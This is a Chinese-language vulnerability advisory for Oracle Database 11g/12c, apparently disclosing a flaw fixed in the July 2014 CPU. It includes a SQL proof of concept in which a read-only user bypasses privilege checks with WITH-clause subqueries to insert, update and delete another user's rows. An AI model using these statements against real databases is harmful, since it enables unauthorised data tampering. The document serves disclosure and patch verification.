【性质】高危漏洞
【危害】仅有查询权限的用户可以对数据进行增、删、改操作
【影响范围】广泛，包括11.2.0.3，11.2.0.4，12.1等版本（10g版本不包含）。
【修复】2014年7月的CPU中被修正，强烈建议您检查所有Oracle数据库，确认是否存在该安全风险。

与此有关的CVE号包括：CVE-2013-3751、CVE-2014-4236、CVE-2014-4237、CVE-2014-4245、CVE-2013-3774 .

相关信息还可以参考Oracle的CPU页面：
http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html

【bug test】
--100.95  Oracle Database 11g Enterprise Edition Release 11.2.0.3.0 - 64bit
SQL> conn ncv502/ncv502
create user test identified by test;
grant create session to test;
create table t (ID number(4)); 
insert into t(ID) values(1); 
select * from t;
grant select on t to test;

SQL> conn test/test
select * from ncv502.t;
update ncv502.t set id = 1 where id = 1;
              *
第 1 行出现错误:
ORA-01031: 权限不足

--在WITH语句中，权限限制被完全绕过，增删改权限被获得
SQL> update (with tmp as (select id from ncv502.t) select id from tmp) set id = 0 where id = 1;
1 row updated.
SQL> commit;
Commit complete.
SQL> delete (with temp as (select * from ncv502.t) select id from temp) where id = 0;
1 row deleted.
SQL> insert into (with temp as (select * from ncv502.t) select * from temp) select 2 from dual;
1 row created.

drop table t purge ;
drop user test cascade;

--71 Oracle Database 10g Enterprise Edition Release 10.2.0.4.0 - 64bit  没有该bug

